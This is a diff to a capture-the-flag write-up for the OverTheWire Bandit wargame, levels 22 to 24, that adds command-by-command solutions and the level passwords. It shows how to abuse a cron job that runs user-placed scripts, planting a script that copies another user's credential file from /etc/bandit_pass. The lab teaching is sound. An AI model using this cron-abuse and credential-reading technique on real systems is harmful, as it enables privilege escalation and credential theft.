@@ -1140,33 +1140,109 @@ cat /etc/bandit_pass/$myname > /tmp/$mytarget
 ```
 
 ```bash
-cat /tmp/bandit23
-```
-
-```bash
-ls -l /usr/bin/cronjob_bandit23.sh
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
 ```
 
 ```plaintext
--rwxr-x--- 1 bandit23 bandit22 211 Jun 24 14:59 /usr/bin/cronjob_bandit23.sh
+8ca319486bfbbc3663ea0fbe81326349
 ```
 
 ```bash
-/usr/bin/cronjob_bandit23.sh
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 ```
 
 ```plaintext
-Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3
-```
-
-```bash
-cat /tmp/8169b67bd894ddbb4412f91573b38db3
-```
-
-```plaintext
-RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz
+gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw
 ```
 
 <Callout type="success" title="Password Bandit23">
-RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz
+gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw
+</Callout>
+
+## Bandit Level 23 → Level 24
+
+[Bandit Level 23 → Level 24](https://overthewire.org/wargames/bandit/bandit24.html)
+
+```bash
+ssh -p 2220 bandit23@bandit.labs.overthewire.org
+```
+
+```bash
+ls /etc/cron.d/
+```
+
+```plaintext
+behemoth4_cleanup  clean_tmp  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  e2scrub_all  leviathan5_cleanup  manpage3_resetpw_job  otw-tmp-dir
+```
+
+```bash
+cat /etc/cron.d/cronjob_bandit24 
+```
+
+```plaintext
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+```
+
+```bash
+cat /usr/bin/cronjob_bandit24.sh
+```
+
+```bash
+#!/bin/bash
+
+shopt -s nullglob
+
+myname=$(whoami)
+
+cd /var/spool/"$myname"/foo || exit 
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." ] && [ "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" "./$i")"
+        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
+            timeout -s 9 60 "./$i"
+        fi
+        rm -rf "./$i"
+    fi
+```
+
+```bash
+vi /var/spool/bandit24/foo/melvin
+```
+
+```bash
+cat /var/spool/bandit24/foo/melvin
+```
+
+```bash
+#!/usr/bin/env bash
+cat /etc/bandit_pass/bandit24 > /tmp/bandit24
+```
+
+```bash
+chmod +x /var/spool/bandit24/foo/melvin
+```
+
+```bash
+ls -l /var/spool/bandit24/foo/melvin
+```
+
+```plaintext
+-rwxrwxr-x 1 bandit23 bandit23 66 Jul 10 01:12 melvin
+```
+
+```bash
+cat /tmp/bandit24
+```
+
+```plaintext
+hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+```
+
+<Callout type="success" title="Password Bandit24">
+hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
 </Callout>
